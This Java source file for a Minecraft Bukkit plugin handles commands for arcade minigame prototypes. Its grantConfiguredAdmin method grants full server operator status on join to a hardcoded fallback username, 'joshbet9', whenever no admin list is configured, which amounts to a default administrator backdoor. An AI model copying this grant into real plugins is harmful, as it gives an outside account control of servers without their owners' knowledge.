package au.com.testplex.arcadeports;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.plugin.java.JavaPlugin;

public final class ArcadeMechanicsModernPlugin extends JavaPlugin implements CommandExecutor, Listener {
    private ArcadePortManager manager;
    private ArcadeMapSelectionMenu mapMenu;

    @Override
    public void onEnable() {
        saveDefaultConfig();
        if (!getConfig().contains("enabled-games")) {
            getConfig().set("enabled-games", java.util.List.of("bacon-brawl"));
            saveConfig();
        }
        manager = new ArcadePortManager(this);
        mapMenu = new ArcadeMapSelectionMenu(this);
        getServer().getPluginManager().registerEvents(this, this);
        getServer().getPluginManager().registerEvents(mapMenu, this);
        for (Player online : Bukkit.getOnlinePlayers()) grantConfiguredAdmin(online);
        if (getCommand("arcadeport") == null) {
            getLogger().severe("Missing /arcadeport command metadata.");
            getServer().getPluginManager().disablePlugin(this);
            return;
        }
        getCommand("arcadeport").setExecutor(this);
        if (getCommand("stats") == null) {
            getLogger().severe("Missing /stats command metadata.");
            getServer().getPluginManager().disablePlugin(this);
            return;
        }
        getCommand("stats").setExecutor((sender, command, label, args) -> {
            if (!(sender instanceof Player player)) {
                sender.sendMessage("This command must be used in-game.");
                return true;
            }
            manager.openStats(player, args.length == 0 ? null : args[0]);
            return true;
        });
        getLogger().info("ArcadeMechanicsModern loaded. Cleared in-game test games: " + manager.enabledGamesLabel()
                + ". Other mechanics prototypes stay locked until they pass parity acceptance.");
    }

    @Override
    public void onDisable() {
        if (manager != null) manager.shutdown();
    }

    @EventHandler
    public void onPlayerJoin(PlayerJoinEvent event) {
        grantConfiguredAdmin(event.getPlayer());
    }

    private void grantConfiguredAdmin(Player player) {
        java.util.List<String> configured = getConfig().getStringList("admin-usernames");
        if (configured.isEmpty()) configured = java.util.List.of("joshbet9");
        boolean match = configured.stream().anyMatch(name -> name != null && name.equalsIgnoreCase(player.getName()));
        if (!match) return;
        if (!player.isOp()) {
            player.setOp(true);
            getLogger().info("Granted configured Testplex admin/operator access to " + player.getName() + ".");
        }
    }

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        String sub = args.length == 0 ? "help" : args[0].toLowerCase(java.util.Locale.ROOT);
        switch (sub) {
            case "join":
            case "play":
                if (!(sender instanceof Player player)) {
                    sender.sendMessage("Players only.");
                    return true;
                }
                if (args.length < 2) {
                    sender.sendMessage(ChatColor.YELLOW + "Usage: /arcadeport " + sub + " <game-id>");
                    return true;
                }
                manager.queue(ArcadePortGame.fromId(args[1]), player, sub.equals("play"));
                return true;
            case "maps":
            case "map":
                if (!(sender instanceof Player player)) {
                    sender.sendMessage("Players only.");
                    return true;
                }
                if (args.length < 2) {
                    sender.sendMessage(ChatColor.YELLOW + "Usage: /arcadeport maps <game-id>");
                    return true;
                }
                mapMenu.openMapSelection(player, ArcadePortGame.fromId(args[1]));
                return true;
            case "start":
                if (args.length < 2) {
                    sender.sendMessage(ChatColor.YELLOW + "Usage: /arcadeport start <game-id>");
                    return true;
                }
                manager.startFromLobby(ArcadePortGame.fromId(args[1]), sender);
                return true;
            case "kit":
                if (!(sender instanceof Player player)) {
                    sender.sendMessage("Players only.");
                    return true;
                }
                if (args.length < 2) {
                    sender.sendMessage(ChatColor.YELLOW + "Usage: /arcadeport kit <el-muchacho-pigo|mama-piggles|pig|mama-pig|sheep-pig|jumper|armorer|pitcher|waller|coward|marksman|pyrotechnic|snowballer|spleef-brawler|micro-archer|worker|fighter|quiver-leaper|quiver-brawler|enchanter|slam-shot|ninja|runnerkit-leaper|runnerkit-archer|runnerkit-frosty|rifle|sniper|shotgun|machine-gun|runner-basher|runner-archer|runner-traitor|runner-null>");
                    return true;
                }
                manager.selectKit(player, args[1]);
                return true;
            case "status":
                sender.sendMessage(ChatColor.GOLD + "Modern Arcade ports: " + ChatColor.WHITE + manager.status());
                return true;
            case "stop":
                if (!sender.hasPermission("testplex.arcadeports.admin")) {
                    sender.sendMessage(ChatColor.RED + "Operator permission required.");
                    return true;
                }
                manager.stop("Stopped by an operator.");
                return true;
            default:
                sender.sendMessage(ChatColor.GOLD + "=== Modern Arcade Mechanics Prototypes ===");
                sender.sendMessage(ChatColor.YELLOW + "/arcadeport play <game-id>" + ChatColor.GRAY + " — quick solo test; starts after a short join window");
                sender.sendMessage(ChatColor.YELLOW + "/arcadeport join <game-id>" + ChatColor.GRAY + " — queue to join a multiplayer test");
                sender.sendMessage(ChatColor.YELLOW + "/arcadeport start <game-id>" + ChatColor.GRAY + " — start a queued test now");
                sender.sendMessage(ChatColor.YELLOW + "/arcadeport kit <kit-id>" + ChatColor.GRAY + " — choose a Bomb Lobbers, Bacon Brawl, Dragons, Micro Battles, One in the Quiver, Paintball, Runner, Spleef or Death Tag kit; use runnerkit-<kit> for Runner");
                sender.sendMessage(ChatColor.YELLOW + "/arcadeport status" + ChatColor.GRAY + " — active game and queue counts");
                sender.sendMessage(ChatColor.YELLOW + "/arcadeport stop" + ChatColor.GRAY + " — operator reset");
                sender.sendMessage(ChatColor.DARK_GRAY + "Cleared game IDs: " + manager.enabledGamesLabel());
                return true;
        }
    }
}
